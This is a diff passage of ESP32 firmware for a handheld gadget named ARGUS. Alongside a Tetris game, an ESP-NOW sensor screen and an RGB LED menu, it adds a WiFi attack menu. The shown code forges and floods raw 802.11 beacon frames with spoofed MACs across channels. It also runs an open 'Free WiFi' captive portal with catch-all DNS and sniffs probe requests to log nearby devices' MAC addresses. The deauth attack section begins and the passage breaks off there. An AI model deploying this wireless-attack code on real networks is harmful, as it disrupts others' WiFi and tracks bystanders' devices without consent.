+    bagPos=7; nextType=takePiece(); spawn();
+    selectWasDown=false; selectLongDone=false; backWasDown=false; nextWasDown=false; comboWasDown=false;
+    lastFall=millis();
+  }
+  void cell(int x,int y,uint16_t c){
+    int xx=X+x*CELL, yy=Y+y*CELL;
+    tft.fillRoundRect(xx,yy,CELL-1,CELL-1,1,c);
+    tft.drawFastHLine(xx+1,yy+1,CELL-3,CREAM);
+  }
+  void draw(){
+    tft.fillScreen(BG);
+    tft.setTextSize(1);
+    tft.setTextColor(ORANGE); tft.setCursor(4,4); tft.print("ARGUS");
+    tft.setTextColor(CREAM); tft.setCursor(51,4); tft.print("TETRIS");
+    tft.setTextColor(PEACH); tft.setCursor(104,4); tft.print("S:"); tft.print(score);
+    tft.fillRoundRect(X-2,Y-2,W*CELL+4,H*CELL+4,3,PANEL);
+    tft.fillRect(X,Y,W*CELL,H*CELL,BG);
+    for(int y=0;y<H;y++){
+      tft.drawFastHLine(X,Y+y*CELL,W*CELL,GRID);
+      for(int x=0;x<W;x++) if(board[y][x]) cell(x,y,colors[board[y][x]-1]);
+    }
+    if(!over){
+      for(int i=0;i<4;i++){
+        int xx=px+shape[type][rot][i][0], yy=py+shape[type][rot][i][1];
+        if(xx>=0&&xx<W&&yy>=0&&yy<H) cell(xx,yy,colors[type]);
+      }
+    }
+    if(over){
+      tft.fillRoundRect(17,48,126,32,5,PANEL);
+      tft.drawRoundRect(17,48,126,32,5,ORANGE);
+      tft.setTextColor(CREAM); tft.setCursor(48,58); tft.print("GAME OVER");
+      tft.setTextColor(PEACH); tft.setCursor(51,69); tft.print("SCORE "); tft.print(score);
+    }
+  }
+  void lock(){
+    for(int i=0;i<4;i++){
+      int xx=px+shape[type][rot][i][0], yy=py+shape[type][rot][i][1];
+      if(yy>=0&&yy<H&&xx>=0&&xx<W) board[yy][xx]=type+1;
+    }
+    int cleared=0;
+    for(int y=H-1;y>=0;y--){
+      bool full=true; for(int x=0;x<W;x++) if(!board[y][x]) {full=false;break;}
+      if(full){
+        cleared++;
+        for(int yy=y;yy>0;yy--) for(int x=0;x<W;x++) board[yy][x]=board[yy-1][x];
+        for(int x=0;x<W;x++) board[0][x]=0;
+        y++;
+      }
+    }
+    if(cleared){
+      const uint16_t pts[]={0,100,300,500,800};
+      score+=(cleared<=4?pts[cleared]:800)*level;
+      lines+=cleared; level=1+lines/8;
+      beepSuccess();
+    }
+    spawn();
+  }
+  void hardDrop(){
+    int dist=0;
+    while(!hit(px,py+1,rot)){py++;dist++;}
+    score+=(uint32_t)dist*2;
+    lock(); draw();
+  }
+  void tick(bool entered){
+    if(entered){reset();draw();}
+    uint32_t now=millis();
+    bool b=(digitalRead(BTN_BACK)==LOW), n=(digitalRead(BTN_NEXT)==LOW), sel=(digitalRead(BTN_SELECT)==LOW);
+    // SELECT: short press rotates/restarts; hold for four seconds exits.
+    if(sel && !selectWasDown){selectWasDown=true;selectDownAt=now;selectLongDone=false;}
+    if(sel && selectWasDown && !selectLongDone && now-selectDownAt>=4000){
+      selectLongDone=true; screen=MAIN; beepBack(); return;
+    }
+    if(!sel && selectWasDown){
+      uint32_t held=now-selectDownAt; selectWasDown=false;
+      if(!selectLongDone && held<4000){
+        if(over){reset();draw();}
+        else{
+          int nr=(rot+1)%4;
+          if(!hit(px,py,nr))rot=nr;
+          else if(!hit(px-1,py,nr)){px--;rot=nr;}
+          else if(!hit(px+1,py,nr)){px++;rot=nr;}
+          draw();
+        }
+      }
+    }
+    if(over){backWasDown=b;nextWasDown=n;return;}
+    // Simultaneously press LEFT+RIGHT for a hard drop (one action per hold).
+    if(b&&n&&!comboWasDown){hardDrop();comboWasDown=true;}
+    if(!b||!n) comboWasDown=false;
+    if(!(b&&n)){
+      if(b && (!backWasDown || now-lastHorizontal>=125)){
+        if(!hit(px-1,py,rot))px--;
+        lastHorizontal=now; draw();
+      }
+      if(n && (!nextWasDown || now-lastHorizontal>=125)){
+        if(!hit(px+1,py,rot))px++;
+        lastHorizontal=now; draw();
+      }
+    }
+    backWasDown=b; nextWasDown=n;
+    uint32_t delayMs=max((uint32_t)95,(uint32_t)520-(uint32_t)(level-1)*32);
+    if(now-lastFall>=delayMs){
+      lastFall=now;
+      if(!hit(px,py+1,rot))py++;
+      else lock();
+      draw();
+    }
+  }
+}
+
+// ================= ARGUS LINK: ESP-NOW SENSOR REQUEST =================
+struct ArgusLinkPacket {
+  uint32_t magic;
+  uint8_t type; // 1=request, 2=response
+  float temperature;
+  float humidity;
+  uint8_t ok;
+};
+static constexpr uint32_t ARGUS_LINK_MAGIC = 0xA612C3D1;
+static const uint8_t ARGUS_LINK_BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+volatile bool argusLinkResponseReady = false;
+volatile bool argusLinkSensorOK = false;
+volatile float argusLinkTemperature = 0.0f;
+volatile float argusLinkHumidity = 0.0f;
+volatile uint32_t argusLinkResponseAt = 0;
+bool argusLinkStarted = false;
+bool argusLinkWaiting = false;
+uint32_t argusLinkRequestAt = 0;
+uint32_t argusLinkLastResponseAt = 0;
+
+void argusLinkOnRecv(const esp_now_recv_info_t *info, const uint8_t *data, int len) {
+  if (!info || !data || len != (int)sizeof(ArgusLinkPacket)) return;
+  ArgusLinkPacket packet;
+  memcpy(&packet, data, sizeof(packet));
+  if (packet.magic != ARGUS_LINK_MAGIC || packet.type != 2) return;
+  argusLinkTemperature = packet.temperature;
+  argusLinkHumidity = packet.humidity;
+  argusLinkSensorOK = packet.ok != 0;
+  argusLinkResponseAt = millis();
+  argusLinkResponseReady = true;
+}
+
+bool argusLinkStart() {
+  if (argusLinkStarted) return true;
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(false, false);
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  if (esp_now_init() != ESP_OK) return false;
+  esp_now_register_recv_cb(argusLinkOnRecv);
+  esp_now_peer_info_t peer = {};
+  memcpy(peer.peer_addr, ARGUS_LINK_BROADCAST, 6);
+  peer.channel = 1;
+  peer.encrypt = false;
+  if (!esp_now_is_peer_exist(ARGUS_LINK_BROADCAST)) esp_now_add_peer(&peer);
+  argusLinkStarted = true;
+  return true;
+}
+
+void argusLinkStop() {
+  if (argusLinkStarted) {
+    esp_now_deinit();
+    argusLinkStarted = false;
+  }
+  argusLinkWaiting = false;
+}
+
+void argusLinkRequest() {
+  if (!argusLinkStart()) {
+    argusLinkWaiting = false;
+    return;
+  }
+  ArgusLinkPacket packet = {ARGUS_LINK_MAGIC, 1, 0.0f, 0.0f, 0};
+  argusLinkResponseReady = false;
+  argusLinkWaiting = true;
+  argusLinkRequestAt = millis();
+  esp_now_send(ARGUS_LINK_BROADCAST, (const uint8_t *)&packet, sizeof(packet));
+}
+
+void drawArgusLink() {
+  clearScreen(COL_BG);
+  tft.drawFastHLine(0, 22, 160, COL_ACCENT);
+  tft.setTextColor(COL_ACCENT); tft.setTextSize(2); tft.setCursor(7, 4); tft.print("ARGUS LINK");
+  tft.setTextSize(1);
+  tft.drawRoundRect(6, 30, 148, 81, 7, COL_ACCENT2);
+  tft.setTextColor(COL_DIM); tft.setCursor(15, 39); tft.print("TEMPERATURE");
+  tft.setTextColor(COL_TEXT); tft.setTextSize(2); tft.setCursor(15, 52);
+  if (argusLinkLastResponseAt == 0) tft.print("--.- C");
+  else { tft.print((float)argusLinkTemperature, 1); tft.print(" C"); }
+  tft.setTextSize(1); tft.setTextColor(COL_DIM); tft.setCursor(15, 79); tft.print("HUMIDITY");
+  tft.setTextColor(COL_TEXT); tft.setTextSize(2); tft.setCursor(15, 91);
+  if (argusLinkLastResponseAt == 0) tft.print("-- %");
+  else { tft.print((int)(argusLinkHumidity + 0.5f)); tft.print(" %"); }
+  tft.setTextSize(1); tft.setCursor(8, 119);
+  if (!argusLinkStarted) { tft.setTextColor(COL_WARN); tft.print("LINK INIT ERROR"); }
+  else if (argusLinkWaiting) { tft.setTextColor(COL_ACCENT2); tft.print("REQUESTING..."); }
+  else if (argusLinkLastResponseAt == 0) { tft.setTextColor(COL_DIM); tft.print("NO DATA"); }
+  else if (millis() - argusLinkLastResponseAt > 15000) { tft.setTextColor(COL_WARN); tft.print("DISCONNECTED"); }
+  else if (!argusLinkSensorOK) { tft.setTextColor(COL_WARN); tft.print("SENSOR ERROR"); }
+  else { tft.setTextColor(COL_ACCENT2); tft.print("CONNECTED"); }
+  // No grey button hints: only a clean orange action button.
+  tft.drawRoundRect(35, 136, 90, 20, 5, COL_ACCENT);
+  tft.setTextColor(COL_ACCENT2); tft.setCursor(48, 143); tft.print("REQUEST");
+}
+
+void tickArgusLink(bool entered) {
+  if (entered) {
+    argusLinkWaiting = false;
+    argusLinkResponseReady = false;
+    if (!argusLinkStart()) { argusLinkStarted = false; }
+    drawArgusLink();
+  }
+  if (backPressed()) { argusLinkStop(); screen = MAIN; return; }
+  if (selectPressed()) {
+    argusLinkRequest();
+    drawArgusLink();
+  }
+  if (argusLinkResponseReady) {
+    noInterrupts();
+    argusLinkResponseReady = false;
+    interrupts();
+    argusLinkLastResponseAt = argusLinkResponseAt;
+    argusLinkWaiting = false;
+    drawArgusLink();
+  }
+  if (argusLinkWaiting && millis() - argusLinkRequestAt > 2500) {
+    argusLinkWaiting = false;
+    drawArgusLink();
+  }
+}
+
+// ================= RGB LED CONTROL =================
+bool rgbRainbowEnabled = false;
+uint16_t rgbHue = 0;
+uint32_t rgbLastStep = 0;
+int rgbMenuItem = 0;
+
+void rgbSetOff() {
+  rgbRainbowEnabled = false;
+  rgbLed.clear();
+  rgbLed.show();
+}
+
+void rgbTick() {
+  if (!rgbRainbowEnabled) return;
+  uint32_t now = millis();
+  if (now - rgbLastStep < 25) return;
+  rgbLastStep = now;
+  rgbLed.setPixelColor(0, rgbLed.gamma32(rgbLed.ColorHSV(rgbHue, 255, 100)));
+  rgbLed.show();
+  rgbHue += 320;
+}
+
+void drawRGBMenu() {
+  clearScreen();
+  header("RGB LIGHT", 7);
+  const char* items[] = {"Start rainbow", "Stop / OFF", "Back"};
+  for (int i=0; i<3; ++i) menuItem(39 + i*22, items[i], i==rgbMenuItem);
+  text(rgbRainbowEnabled ? "STATUS: RAINBOW ON" : "STATUS: OFF", 4, 111, rgbRainbowEnabled ? COL_ACCENT2 : COL_DIM);
+  centerText("NEXT: MOVE  SELECT: OK", 122, COL_DIM);
+}
+
+void tickRGBMenu(bool entered) {
+  if (entered) { rgbMenuItem=0; drawRGBMenu(); }
+  if (backPressed()) { rgbSetOff(); screen=MAIN; return; }
+  if (nextPressed()) { rgbMenuItem=(rgbMenuItem+1)%3; drawRGBMenu(); }
+  if (selectPressed()) {
+    if (rgbMenuItem==0) { rgbRainbowEnabled=true; rgbLastStep=0; rgbHue=0; }
+    else if (rgbMenuItem==1) rgbSetOff();
+    else { rgbSetOff(); screen=MAIN; return; }
+    drawRGBMenu();
+  }
+}
+
+// ARGUS hub groups tools, settings, info and system diagnostics.
+const int ARGUS_ITEMS=4;
+void drawArgusHub() {
+  clearScreen(); header("ARGUS",6);
+  const char* items[ARGUS_ITEMS]={"Tools","Settings","Info / Pins","Back"};
+  for(int i=0;i<ARGUS_ITEMS;i++) menuItem(34+i*21,items[i],i==argusItem);
+  text("NEXT: move  SELECT: open",4,119,COL_DIM);
+}
+void tickArgusHub(bool entered) {
+  if(entered) drawArgusHub();
+  if(backPressed()) { screen=MAIN; return; }
+  if(nextPressed()) { argusItem=(argusItem+1)%ARGUS_ITEMS; drawArgusHub(); }
+  if(selectPressed()) {
+    if(argusItem==0) screen=DISPLAY_TEST;
+    else if(argusItem==1) { settingsItem=0; screen=SETTINGS; }
+    else if(argusItem==2) { infoPage=0; screen=INFO; }
+    else screen=MAIN;
+  }
+}
+
+// ================= WIFI =================
+const char* wifiItems[] = {
+"Scan Networks","My WiFi","Hotspot","Beacon Spam","Captive Portal",
+"Probe Sniffer","Deauth Attack","WiFi Radar","Deauth Detector","Karma Attack"
+};
+const int WIFI_ITEMS = 10;
+const int WIFI_VISIBLE = 5;
+const int WIFI_ITEM_H = 20;
+
+void drawWiFiMenu() {
+clearScreen(); header("WiFi", 0);
+int start = wifiItem - WIFI_VISIBLE/2;
+if (start < 0) start = 0;
+if (start > WIFI_ITEMS - WIFI_VISIBLE) start = WIFI_ITEMS - WIFI_VISIBLE;
+for (int row = 0; row < WIFI_VISIBLE; row++) {
+int i = start + row; if (i >= WIFI_ITEMS) break;
+menuItem(30 + row * WIFI_ITEM_H, wifiItems[i], i == wifiItem);
+}
+if (WIFI_ITEMS > WIFI_VISIBLE) {
+int trackY = 26, trackH = 96;
+tft.drawFastVLine(156, trackY, trackH, COL_DIM);
+int thumbH = trackH * WIFI_VISIBLE / WIFI_ITEMS;
+int thumbY = trackY + (trackH - thumbH) * wifiItem / (WIFI_ITEMS - 1);
+tft.fillRect(155, thumbY, 3, thumbH, COL_ACCENT);
+}
+}
+
+const int NET_ROW_H = 20, NET_VISIBLE = 5;
+void drawNetworkList() {
+clearScreen(); header("Networks", 0);
+if (networkCount == 0) { centerText("No networks", 60, COL_WARN); return; }
+int start = networkItem - NET_VISIBLE/2;
+if (start < 0) start = 0;
+if (start > networkCount - NET_VISIBLE) start = networkCount - NET_VISIBLE;
+for (int row = 0; row < NET_VISIBLE; row++) {
+int i = start + row; if (i >= networkCount) break;
+int y = 28 + row * NET_ROW_H;
+String ssid = WiFi.SSID(i); if (ssid.length() == 0) ssid = "<hidden>";
+bool sel = (i == networkItem);
+if (sel) tft.fillRoundRect(2, y-2, 154, 18, 4, COL_ACCENT);
+char shortSsid[20]; truncateTo(ssid.c_str(), shortSsid, 18);
+text(shortSsid, 6, y+2, sel ? COL_BG : COL_ACCENT2);
+char r[8]; snprintf(r, sizeof(r), "%d", WiFi.RSSI(i));
+text(r, 120, y+2, sel ? COL_BG : COL_ACCENT);
+bool open = WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
+text(open ? "O" : "L", 144, y+2, open ? COL_OK : COL_WARN);
+}
+if (networkCount > NET_VISIBLE) {
+int trackY = 26, trackH = 100;
+tft.drawFastVLine(156, trackY, trackH, COL_DIM);
+int thumbH = trackH * NET_VISIBLE / networkCount;
+if (thumbH < 4) thumbH = 4;
+int thumbY = trackY + (trackH - thumbH) * networkItem / (networkCount - 1);
+tft.fillRect(155, thumbY, 3, thumbH, COL_ACCENT);
+}
+}
+
+bool scanNetworks() {
+WiFi.scanDelete();
+WiFi.scanNetworks(true, true);
+int frame = 0;
+unsigned long start = millis();
+while (WiFi.scanComplete() == WIFI_SCAN_RUNNING && millis() - start < 15000) {
+clearScreen(); header("WiFi", 0);
+const char* dots[4] = {"", ".", "..", "..."};
+char buf[20]; snprintf(buf, sizeof(buf), "Scanning%s", dots[frame++ % 4]);
+centerText(buf, 60, COL_ACCENT, 2);
+delay(150);
+if (backPressed()) { WiFi.scanDelete(); return false; }
+}
+networkCount = WiFi.scanComplete();
+if (networkCount <= 0) {
+networkCount = 0;
+message("WiFi", "No networks", nullptr, COL_WARN);
+delay(800); return false;
+}
+networkItem = 0; return true;
+}
+
+void showNetworkInfo(int i) {
+clearScreen(); header("Network", 0);
+String ssid = WiFi.SSID(i); if (ssid.length() == 0) ssid = "<hidden>";
+char su[22]; truncateTo(ssid.c_str(), su, 21);
+text(su, 6, 30, COL_TEXT);
+uint8_t* bssid = WiFi.BSSID(i);
+if (bssid) {
+char vb[24]; snprintf(vb, sizeof(vb), "Vendor: %s", ouiVendor(bssid));
+text(vb, 6, 48, COL_ACCENT2);
+}
+char b[32]; snprintf(b, sizeof(b), "RSSI: %d dBm", WiFi.RSSI(i)); text(b, 6, 64, COL_ACCENT);
+char ch[24]; snprintf(ch, sizeof(ch), "Channel: %d", WiFi.channel(i)); text(ch, 6, 80, COL_ACCENT2);
+bool open = WiFi.encryptionType(i) == WIFI_AUTH_OPEN;
+text(open ? "OPEN" : "LOCKED", 6, 96, open ? COL_OK : COL_WARN);
+text(open ? "SEL: connect" : "PASSWORD REQ", 6, 112, open ? COL_TEXT : COL_ACCENT);
+}
+
+void connectOpenNetwork(int i) {
+if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN) {
+message("WiFi", "Password required", nullptr, COL_ACCENT);
+beepError(); delay(900); return;
+}
+String ssid = WiFi.SSID(i);
+WiFi.disconnect(true); delay(150);
+WiFi.begin(ssid.c_str());
+unsigned long start = millis(); int frame = 0;
+while (WiFi.status() != WL_CONNECTED && millis() - start < 9000) {
+if (backPressed()) { WiFi.disconnect(); return; }
+clearScreen(); header("Connecting", 0);
+const char* dots[4] = {"", ".", "..", "..."};
+char buf[20]; snprintf(buf, sizeof(buf), "Connecting%s", dots[frame++ % 4]);
+centerText(buf, 60, COL_ACCENT, 2);
+delay(200);
+}
+if (WiFi.status() == WL_CONNECTED) { message("Connected", WiFi.localIP().toString().c_str(), nullptr, COL_OK); beepSuccess(); }
+else { message("Failed", "Connection failed", nullptr, COL_WARN); beepError(); }
+delay(900);
+}
+
+void showWiFiStatus() {
+clearScreen(); header("My WiFi", 0);
+if (WiFi.status() != WL_CONNECTED) { centerText("Not connected", 60, COL_WARN); return; }
+char ssid[22]; truncateTo(WiFi.SSID().c_str(), ssid, 21);
+text(ssid, 6, 32, COL_ACCENT);
+text(WiFi.localIP().toString().c_str(), 6, 52, COL_TEXT);
+char b[30]; snprintf(b, sizeof(b), "RSSI %d dBm", WiFi.RSSI()); text(b, 6, 72, COL_ACCENT2);
+char m[30]; snprintf(m, sizeof(m), "MAC %s", WiFi.macAddress().c_str()); text(m, 6, 92, COL_DIM);
+}
+
+void startHotspot() { WiFi.mode(WIFI_AP_STA); WiFi.softAP("ARGUS-Hotspot"); apActive = true; beepSuccess(); }
+void stopHotspot()  { WiFi.softAPdisconnect(true); WiFi.mode(WIFI_STA); apActive = false; beepBack(); }
+void drawHotspotScreen() {
+clearScreen(); header("Hotspot", 0);
+if (apActive) {
+centerText("Hotspot ON", 36, COL_ACCENT, 2);
+text("SSID", 10, 64, COL_ACCENT2); text("ARGUS-Hotspot", 46, 64, COL_TEXT);
+text("IP", 10, 80, COL_ACCENT2); text(WiFi.softAPIP().toString().c_str(), 46, 80, COL_TEXT);
+char c[20]; snprintf(c, sizeof(c), "Clients: %d", WiFi.softAPgetStationNum()); text(c, 10, 96, COL_ACCENT);
+centerText("SELECT: stop", 116, COL_DIM);
+} else {
+centerText("Hotspot OFF", 56, COL_WARN, 2);
+centerText("SELECT: start", 96, COL_DIM);
+}
+}
+void tickHotspot(bool entered) {
+if (entered) drawHotspotScreen();
+if (backPressed()) { screen = WIFI_MENU; return; }
+if (selectPressed()) { if (apActive) stopHotspot(); else startHotspot(); drawHotspotScreen(); }
+}
+
+// ================= BEACON SPAM =================
+const char* beaconSSIDs[] = { "FBI Van","Free WiFi","Virus.exe","NSA Unit 4","Loading...","Get off my WiFi","Wu Tang LAN","404 WiFi" };
+const int BEACON_SSID_COUNT = sizeof(beaconSSIDs)/sizeof(beaconSSIDs[0]);
+int bsOK = 0, bsErr = 0;
+void sendBeacon(const char* ssid, uint8_t channel) {
+int ssidLen = strlen(ssid); if (ssidLen > 32) ssidLen = 32;
+uint8_t mac[6];
+for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
+mac[0] &= 0xFE; mac[0] |= 0x02;
+uint8_t packet[128]; int i = 0;
+packet[i++]=0x80;packet[i++]=0x00;packet[i++]=0x00;packet[i++]=0x00;
+for (int k=0;k<6;k++) packet[i++]=0xFF;
+for (int k=0;k<6;k++) packet[i++]=mac[k];
+for (int k=0;k<6;k++) packet[i++]=mac[k];
+packet[i++]=0x00;packet[i++]=0x00;
+for (int k=0;k<8;k++) packet[i++]=0x00;
+packet[i++]=0x64;packet[i++]=0x00;
+packet[i++]=0x01;packet[i++]=0x04;packet[i++]=0x00;packet[i++]=ssidLen;
+for (int k=0;k<ssidLen;k++) packet[i++]=ssid[k];
+packet[i++]=0x01;packet[i++]=0x08;
+packet[i++]=0x82;packet[i++]=0x84;packet[i++]=0x8B;packet[i++]=0x96;
+packet[i++]=0x0C;packet[i++]=0x12;packet[i++]=0x18;packet[i++]=0x24;
+packet[i++]=0x03;packet[i++]=0x01;packet[i++]=channel;
+esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, packet, i, false);
+if (r == ESP_OK) bsOK++; else bsErr++;
+}
+void tickBeaconSpam(bool entered) {
+static int channel = 1, currentIdx = 0;
+static unsigned long lastDraw = 0, lastChannelSwitch = 0;
+if (entered) {
+WiFi.scanDelete(); WiFi.mode(WIFI_OFF); delay(200);
+WiFi.mode(WIFI_STA); delay(300);
+esp_wifi_set_ps(WIFI_PS_NONE);
+esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+channel = 1; currentIdx = 0; bsOK = 0; bsErr = 0;
+lastDraw = 0; lastChannelSwitch = millis();
+clearScreen(); header("Beacon Spam", 0);
+centerText("Activating...", 60, COL_ACCENT, 2);
+beepSuccess(); delay(500);
+}
+for (int i = 0; i < 6; i++) {
+sendBeacon(beaconSSIDs[currentIdx], channel);
+currentIdx = (currentIdx + 1) % BEACON_SSID_COUNT;
+}
+if (millis() - lastChannelSwitch > 80) {
+lastChannelSwitch = millis();
+channel = (channel % 13) + 1;
+esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+}
+if (millis() - lastDraw > 200) {
+lastDraw = millis();
+clearScreen(); header("Beacon Spam", 0);
+centerText("ACTIVE", 28, COL_ACCENT, 2);
+char buf[32];
+snprintf(buf, sizeof(buf), "OK: %d  ERR: %d", bsOK, bsErr); text(buf, 6, 54, bsErr > 0 ? COL_WARN : COL_TEXT);
+snprintf(buf, sizeof(buf), "Channel: %d", channel); text(buf, 6, 70, COL_ACCENT);
+text("SSID:", 6, 86, COL_ACCENT2);
+char ss[22]; truncateTo(beaconSSIDs[currentIdx], ss, 20);
+text(ss, 6, 100, COL_TEXT);
+centerText("BACK: stop", 118, COL_DIM);
+}
+if (backPressed()) { esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); screen = WIFI_MENU; return; }
+}
+
+// ================= CAPTIVE PORTAL =================
+const char PORTAL_SSID[] = "Free WiFi";
+const char PORTAL_HTML[] PROGMEM = R"HTML(
+
+<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Wi-Fi</title>  <style>html,body{margin:0;padding:0;height:100%;background:#000}body{display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif}  
+h1{color:#ff8c00;font-size:15vw;margin:0;text-align:center;letter-spacing:2px;word-break:break-word;padding:20px}</style></head><body><h1>ARGUS PORTAL</h1></body></html>  )HTML";
+void handleRoot()    { portalServer.send_P(200, "text/html; charset=UTF-8", PORTAL_HTML); }
+void handleNotFound(){ portalServer.send_P(200, "text/html; charset=UTF-8", PORTAL_HTML); }
+int portalClients = 0;
+unsigned long lastPortalDraw = 0, portalStart = 0;
+void drawCaptivePortalScreen() {
+clearScreen(); header("Captive Portal", 0);
+centerText("ACTIVE", 30, COL_ACCENT, 2);
+text("SSID:", 6, 52, COL_ACCENT2); text(PORTAL_SSID, 6, 66, COL_TEXT);
+text("IP:", 6, 82, COL_ACCENT2); text(WiFi.softAPIP().toString().c_str(), 6, 96, COL_TEXT);
+char buf[32]; unsigned long mins = (millis() - portalStart) / 60000;
+snprintf(buf, sizeof(buf), "Clients: %d  Up: %lum", portalClients, mins); text(buf, 6, 110, COL_ACCENT);
+centerText("BACK: stop", 122, COL_DIM);
+}
+void tickCaptivePortal(bool entered) {
+if (entered) {
+WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
+WiFi.mode(WIFI_AP); WiFi.softAP(PORTAL_SSID); delay(300);
+dnsServer.start(53, "*", WiFi.softAPIP());
+portalServer.on("/", HTTP_GET, handleRoot);
+portalServer.onNotFound(handleNotFound);
+portalServer.begin();
+portalClients = 0; portalStart = millis(); lastPortalDraw = 0;
+drawCaptivePortalScreen();
+}
+dnsServer.processNextRequest();
+portalServer.handleClient();
+if (millis() - lastPortalDraw > 500) {
+lastPortalDraw = millis();
+int now = WiFi.softAPgetStationNum();
+if (now != portalClients) {
+if (now > portalClients) beepSuccess(); else beepBack();
+portalClients = now; drawCaptivePortalScreen();
+}
+}
+if (backPressed()) {
+portalServer.stop(); dnsServer.stop();
+WiFi.softAPdisconnect(true); WiFi.mode(WIFI_STA);
+screen = WIFI_MENU; return;
+}
+}
+
+// ================= SNIFFER =================
+struct ProbeEntry { uint8_t mac[6]; char ssid[24]; int8_t rssi; unsigned long lastSeen; };
+const int PROBE_MAX = 10;
+ProbeEntry probeList[PROBE_MAX];
+int probeCount = 0;
+volatile unsigned long probePackets = 0, probeLastSeen = 0;
+volatile char probeLastSSID[24] = "";
+volatile uint8_t probeLastMAC[6] = {0};
+volatile int8_t probeLastRSSI = 0;
+int findProbe(const uint8_t* mac) {
+for (int i = 0; i < probeCount; i++) if (memcmp(probeList[i].mac, mac, 6) == 0) return i;
+return -1;
+}
+void shiftProbes() {
+for (int i = 0; i < PROBE_MAX - 1; i++) probeList[i] = probeList[i + 1];
+probeCount = PROBE_MAX - 1;
+}
+void IRAM_ATTR probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+if (type != WIFI_PKT_MGMT) return;
+wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+uint8_t* p = pkt->payload; int len = pkt->rx_ctrl.sig_len;
+if (len < 24 || (p[0] & 0xF0) != 0x40) return;
+probePackets++; probeLastSeen = millis(); probeLastRSSI = pkt->rx_ctrl.rssi;
+memcpy((void*)probeLastMAC, p + 10, 6);
+probeLastSSID[0] = '\0';
+for (int i = 24; i < len - 2; ) {
+uint8_t tid = p[i], tl = p[i + 1];
+if (i + 2 + tl > len) break;
+if (tid == 0x00) {
+int l = tl > 23 ? 23 : tl;
+memcpy((void*)probeLastSSID, p + i + 2, l); probeLastSSID[l] = '\0'; break;
+}
+i += 2 + tl;
+}
+if (probeLastSSID[0] == '\0') { strncpy((char*)probeLastSSID, "<hidden>", 23); probeLastSSID[23] = '\0'; }
+}
+void updateProbeList() {
+if (probeLastSeen == 0) return;
+int idx = findProbe((const uint8_t*)probeLastMAC);
+if (idx < 0) {
+if (probeCount >= PROBE_MAX) shiftProbes();
+idx = probeCount++;
+memcpy(probeList[idx].mac, (const void*)probeLastMAC, 6);
+playSnifferPing();
+}
+strncpy(probeList[idx].ssid, (const char*)probeLastSSID, 23); probeList[idx].ssid[23] = '\0';
+probeList[idx].rssi = probeLastRSSI; probeList[idx].lastSeen = probeLastSeen;
+probeLastSeen = 0;
+}
+void macToString(const uint8_t* mac, char* out) { sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]); }
+int probeScroll = 0;
+const int PROBE_VISIBLE = 5, PROBE_ROW_H = 12;
+void drawSnifferScreen() {
+clearScreen(); header("Sniffer", 0);
+centerText("SNIFFING", 28, COL_ACCENT, 2);
+char buf[40]; snprintf(buf, sizeof(buf), "Packets: %lu", probePackets); text(buf, 4, 48, COL_TEXT);
+snprintf(buf, sizeof(buf), "Devices: %d", probeCount); text(buf, 4, 60, COL_ACCENT);
+if (probeCount == 0) { centerText("Listening...", 86, COL_ACCENT2); return; }
+int start = probeScroll;
+if (start > probeCount - PROBE_VISIBLE) start = probeCount - PROBE_VISIBLE;
+if (start < 0) start = 0;
+for (int row = 0; row < PROBE_VISIBLE; row++) {
+int i = start + row; if (i >= probeCount) break;
+int y = 74 + row * PROBE_ROW_H;
+char mac[24]; macToString(probeList[i].mac, mac); text(mac, 3, y, COL_TEXT);
+text(ouiVendor(probeList[i].mac), 70, y, COL_ACCENT2);
+char r[6]; snprintf(r, sizeof(r), "%d", probeList[i].rssi); text(r, 142, y, probeList[i].rssi > -60 ? COL_ACCENT : COL_DIM);
+}
+}
+void tickSniffer(bool entered) {
+static unsigned long lastDraw = 0, lastHop = 0; static int chIdx = 0;
+static const uint8_t channels[] = {1, 6, 11};
+if (entered) {
+WiFi.disconnect(true); WiFi.mode(WIFI_OFF); delay(200);
+WiFi.mode(WIFI_STA); delay(300); esp_wifi_set_ps(WIFI_PS_NONE); esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
+probeCount = 0; probePackets = 0; probeLastSeen = 0; probeLastSSID[0] = '\0'; probeScroll = 0;
+esp_wifi_set_promiscuous_rx_cb(probeCallback); esp_wifi_set_promiscuous(true);
+clearScreen(); header("Sniffer", 0); centerText("Starting...", 60, COL_ACCENT, 2); delay(300);
+lastDraw = 0; lastHop = millis(); chIdx = 1;
+}
+if (millis() - lastHop > 5000) { lastHop = millis(); chIdx = (chIdx + 1) % 3; esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE); }
+updateProbeList();
+if (backPressed()) { esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(nullptr); screen = WIFI_MENU; return; }
+if (nextPressed()) { probeScroll++; if (probeScroll > probeCount - 1) probeScroll = probeCount - 1; if (probeScroll < 0) probeScroll = 0; lastDraw = 0; }
+if (millis() - lastDraw > 300) { lastDraw = millis(); drawSnifferScreen(); }
+}
+
+// ================= DEAUTH =================
+const int DEAUTH_MAX_TARGETS = 10;
+struct DeauthTarget { uint8_t bssid[6]; uint8_t channel; char ssid[24]; int8_t rssi; };
+DeauthTarget deauthTargets[DEAUTH_MAX_TARGETS];
+int deauthTargetCount = 0, deauthCurrent = 0, deauthScroll = 0;
+const int DEAUTH_VISIBLE = 5, DEAUTH_ROW_H = 14;
+unsigned long deauthPackets = 0, lastDeauthDraw = 0, lastDeauthSend = 0;
+bool deauthRunning = false;
